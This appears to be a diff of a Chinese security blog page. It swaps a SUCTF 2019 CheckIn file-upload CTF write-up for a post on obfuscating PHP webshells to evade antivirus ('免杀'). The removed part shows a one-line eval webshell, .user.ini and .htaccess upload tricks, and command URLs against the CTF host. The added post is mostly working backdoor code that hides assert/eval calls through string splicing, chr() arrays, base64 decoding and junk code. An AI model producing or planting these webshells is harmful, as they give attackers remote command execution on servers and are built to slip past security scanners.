@@ -16,26 +16,24 @@
   <meta name="author" content="YY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[SUCTF 2019]CheckIn是一道文件上传的题目。  尝试后发现对扩展名进行了限制，上传一句话木马，提示后缀非法；修改后缀为jpg，提示不能包含&lt;?；修改一句话木马为： 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_GET[&amp;#x27;cmd&amp;#x27;]);&lt;&#x2F;script&gt;  提示exif_imagetype:not">
+    <meta name="description" content="php免杀免杀思路，通过编码、嵌套、混淆等各种手段绕过杀软检测。 12345&lt;?php$a &#x3D; &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;q&quot;.&quot;e&quot;.&quot;q&quot;.&quot;r&quot;.&quot;t&quot;;$a &#x3D; str_replace(&quot;q&quot;,&quot;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[ctf-web] SUCTF2019-CheckIn">
-<meta property="og:url" content="https://s1n9l3.github.io/2022/12/07/[ctf-web]%20BUCTF2019-ChickIn/index.html">
+<meta property="og:title" content="[渗透测试] php免杀">
+<meta property="og:url" content="https://s1n9l3.github.io/2022/12/13/[%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95]%20php%E5%85%8D%E6%9D%80/index.html">
 <meta property="og:site_name" content="S1n9l3">
-<meta property="og:description" content="[SUCTF 2019]CheckIn是一道文件上传的题目。  尝试后发现对扩展名进行了限制，上传一句话木马，提示后缀非法；修改后缀为jpg，提示不能包含&lt;?；修改一句话木马为： 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_GET[&amp;#x27;cmd&amp;#x27;]);&lt;&#x2F;script&gt;  提示exif_imagetype:not">
+<meta property="og:description" content="php免杀免杀思路，通过编码、嵌套、混淆等各种手段绕过杀软检测。 12345&lt;?php$a &#x3D; &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;q&quot;.&quot;e&quot;.&quot;q&quot;.&quot;r&quot;.&quot;t&quot;;$a &#x3D; str_replace(&quot;q&quot;,&quot;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221207223543971.png">
-<meta property="article:published_time" content="2022-12-07T14:33:51.710Z">
-<meta property="article:modified_time" content="2022-12-12T14:48:26.383Z">
+<meta property="article:published_time" content="2022-12-13T13:36:25.443Z">
+<meta property="article:modified_time" content="2022-12-13T13:47:27.242Z">
 <meta property="article:author" content="YY">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="ctf-web">
+<meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="免杀">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221207223543971.png">
   
   
   
-  <title>[ctf-web] SUCTF2019-CheckIn - S1n9l3</title>
+  <title>[渗透测试] php免杀 - S1n9l3</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="[ctf-web] SUCTF2019-CheckIn"></span>
+            <span id="subtitle" data-typed-text="[渗透测试] php免杀"></span>
           
         </div>
 
@@ -211,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-12-07 22:33" pubdate>
-          2022年12月7日 晚上
+        <time datetime="2022-12-13 21:36" pubdate>
+          2022年12月13日 晚上
         </time>
       </span>
     
@@ -223,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          941 字
+          1.7k 字
         
       </span>
     
@@ -234,7 +232,7 @@
         
         
         
-          8 分钟
+          15 分钟
         
       </span>
     
@@ -272,34 +270,35 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">[ctf-web] SUCTF2019-CheckIn</h1>
+            <h1 style="display: none">[渗透测试] php免杀</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>是一道文件上传的题目。</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221207223543971.png" srcset="/img/loading.gif" lazyload alt="image-20221207223543971"></p>
-<p>尝试后发现对扩展名进行了限制，上传一句话木马，提示后缀非法；修改后缀为<code>jpg</code>，提示不能包含<code>&lt;?</code>；修改一句话木马为：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+                <h1 id="php免杀"><a href="#php免杀" class="headerlink" title="php免杀"></a>php免杀</h1><p>免杀思路，通过编码、嵌套、混淆等各种手段绕过杀软检测。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;q&quot;</span>.<span class="hljs-string">&quot;e&quot;</span>.<span class="hljs-string">&quot;q&quot;</span>.<span class="hljs-string">&quot;r&quot;</span>.<span class="hljs-string">&quot;t&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$a</span>);<br>@<span class="hljs-variable">$a</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>提示<code>exif_imagetype:not image!</code>；添加<code>GIF89a</code>文件头，上传成功。</p>
-<p>到这里考虑如何能够执行木马，首先想到的是<code>.htaccess</code>，然后使用：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GIF89a</span><br><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;three.jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span> <br></code></pre></td></tr></table></figure>
 
-<p>但是这个好像没有成功，没有能够正确解析<code>three.jpg</code>，可能是因为文件头的原因。</p>
-<p>然后就发现了<code>.user.ini</code>文件，内容为：</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=three.jpg<br></code></pre></td></tr></table></figure>
 
-<p>这段代码表示让所有php文件自动包含某个文件，由于该目录下还有<code>index.php</code>文件，所以就可以通过这个文件来触发木马。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># </span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>df51d2d-<span class="hljs-number">2579</span>-<span class="hljs-number">4</span>e48-<span class="hljs-number">9800</span>-<span class="hljs-number">6</span>a23e289441a.node4.buuoj.cn:<span class="hljs-number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php?cmd=var_dump(scandir(%<span class="hljs-number">22</span>/%<span class="hljs-number">22</span>));<br><span class="hljs-comment"># </span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>df51d2d-<span class="hljs-number">2579</span>-<span class="hljs-number">4</span>e48-<span class="hljs-number">9800</span>-<span class="hljs-number">6</span>a23e289441a.node4.buuoj.cn:<span class="hljs-number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php?cmd=system(%<span class="hljs-number">27</span>cat%<span class="hljs-number">20</span>/flag%<span class="hljs-number">27</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>	<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><strong>记得加分号</strong></p>
-<blockquote>
-<p>同类型：</p>
-<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2></blockquote>
-<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">Web安全-一句话木马_Tr0e的博客-CSDN博客_一句话木马</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/85334893">Web安全-文件上传漏洞与WAF绕过_Tr0e的博客-CSDN博客</a></p>
+<p>base64解码可以过滤不认识的字符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>	<span class="hljs-variable">$ass_bs</span> = <span class="hljs-string">&quot;Y-_X&#123;&#125;NzZ&lt;XJ0&quot;</span>;<br>	<span class="hljs-variable">$ass</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ass_bs</span>);<br>	<span class="hljs-variable">$ass</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ass</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>	<span class="hljs-variable">$ass_bs</span> = <span class="hljs-string">&quot;Y-_X&#123;&#125;NzZ&lt;XJ0&quot;</span>;<br>	<span class="hljs-variable">$ass</span> =<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ass_bs</span>);<br>	<span class="hljs-variable">$ass</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">ass</span>(<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>添加一些无意义的<code>echo</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ass</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>	<span class="hljs-variable">$ass_bs</span> = <span class="hljs-string">&quot;Y-_X&#123;&#125;NzZ&lt;XJ0&quot;</span>;<br>	<span class="hljs-variable">$ass</span> =<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ass_bs</span>);<br>	<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//$_GET[&quot;cmd&quot;]</span><br>	<span class="hljs-variable">$ass</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test&quot;</span>;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>	<span class="hljs-title function_ invoke__">ass</span>(<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]));<br>&#125;<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;@&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>	<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">in</span>(<span class="hljs-params"></span>)</span>&#123;<br>	<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;loader&quot;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125;<br><span class="hljs-title function_ invoke__">in</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>转ASCII码拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ch</span>(<span class="hljs-params"><span class="hljs-variable">$arr</span></span>)</span>&#123;<br>	<span class="hljs-variable">$ass_arr</span>=<span class="hljs-keyword">array</span>();<br>	<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">104</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">114</span>);<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v</span>)&#123;<br>		<span class="hljs-variable">$asse</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span>);<br>		<span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ass_arr</span>, <span class="hljs-variable">$asse</span>);<br>	&#125;<br>	<span class="hljs-variable">$assss</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$ass_arr</span>);<br>	<span class="hljs-variable">$assss</span>(<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-title function_ invoke__">gg</span>(<span class="hljs-string">&quot;cmd&quot;</span>)));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gg</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$a</span>];<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test&quot;</span>;<br>	<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span>&gt;<span class="hljs-number">10</span>)&#123;<br>		<span class="hljs-variable">$i</span> +=<span class="hljs-number">1</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-variable">$ass</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;97&quot;</span>,<span class="hljs-string">&quot;115&quot;</span>,<span class="hljs-string">&quot;115&quot;</span>,<span class="hljs-string">&quot;101&quot;</span>,<span class="hljs-string">&quot;114&quot;</span>,<span class="hljs-string">&quot;116&quot;</span>);<br><span class="hljs-title function_ invoke__">ch</span>(<span class="hljs-variable">$ass</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -318,7 +317,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
   
   
 
@@ -333,11 +332,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/ctf/">#ctf</a>
-      
-        <a href="/tags/ctf-web/">#ctf-web</a>
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
       
         <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">#文件上传</a>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
       
     </div>
   
@@ -349,8 +348,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>[ctf-web] SUCTF2019-CheckIn</div>
-      <div>https://s1n9l3.github.io/2022/12/07/[ctf-web] BUCTF2019-ChickIn/</div>
+      <div>[渗透测试] php免杀</div>
+      <div>https://s1n9l3.github.io/2022/12/13/[渗透测试] php免杀/</div>
     </div>
     <div class="license-meta">
       
@@ -362,7 +361,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年12月7日</div>
+          <div>2022年12月13日</div>
         </div>
       
       
@@ -394,18 +393,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/12/08/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUserialz/" title="[ctf-web] 网鼎杯2020青龙组-AreUSerialz">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[ctf-web] 网鼎杯2020青龙组-AreUSerialz</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/05/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/" title="[ctf-web] 极客大挑战2019-HardSQL">
-                        <span class="hidden-mobile">[ctf-web] 极客大挑战2019-HardSQL</span>
+                      <a href="/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20sql%E6%B3%A8%E5%85%A5%E7%BB%95waf/" title="[渗透测试] SQL注入绕waf">
+                        <span class="hidden-mobile">[渗透测试] SQL注入绕waf</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
